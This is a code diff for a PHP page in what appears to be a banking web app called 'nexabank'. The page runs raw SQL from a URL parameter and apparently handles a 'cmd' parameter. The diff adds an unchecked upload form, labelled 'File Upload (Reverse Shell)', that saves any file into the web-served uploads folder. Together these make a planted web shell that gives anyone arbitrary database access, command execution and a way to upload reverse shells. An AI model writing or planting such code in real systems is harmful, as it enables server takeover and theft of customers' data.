@@ -1,5 +1,5 @@
 <?php
-require_once 'db_config.php'; 
+require_once 'db_config.php';
 
 echo '<!DOCTYPE html>
 <html>
@@ -15,19 +15,23 @@ echo '<!DOCTYPE html>
             </div>
             <div class="card-body">';
 
+if (isset($_FILES['evilfile'])) {
+    $uploadDir = '/var/www/html/nexabank/uploads';
+    $uploadPath = $uploadDir . basename($_FILES['evilfile']['name']);
+    
+    if (move_uploaded_file($_FILES['evilfile']['tmp_name'], $uploadPath)) {
+        echo "<div class='alert alert-success'>File uploaded to: <a href='/uploads/{$_FILES['evilfile']['name']}' target='_blank'>{$uploadPath}</a></div>";
+    } else {
+        echo "<div class='alert alert-danger'>File upload failed.</div>";
+    }
+    echo "<hr>";
+}
+
 if (isset($_GET['sql'])) {
     echo "<h4>SQL Query Results:</h4><pre>";
-    $query = $_GET['sql'];
-    $result = $db->query($query);
-    
+    $result = $db->query($_GET['sql']);
     if ($result) {
-        if ($result->num_rows > 0) {
-            while ($row = $result->fetch_assoc()) {
-                print_r($row);
-            }
-        } else {
-            echo "Query executed, but no results.";
-        }
+        while ($row = $result->fetch_assoc()) print_r($row);
     } else {
         echo "ERROR: " . $db->error;
     }
@@ -41,6 +45,14 @@ if (isset($_GET['cmd'])) {
 }
 
 echo '
+                <h4>File Upload (Reverse Shell)</h4>
+                <form method="POST" enctype="multipart/form-data">
+                    <div class="mb-3">
+                        <input type="file" name="evilfile" class="form-control">
+                    </div>
+                    <button type="submit" class="btn btn-warning">Upload</button>
+                </form>
+                <hr>
                 <h4>SQL Injection Tester</h4>
                 <form method="GET">
                     <div class="mb-3">
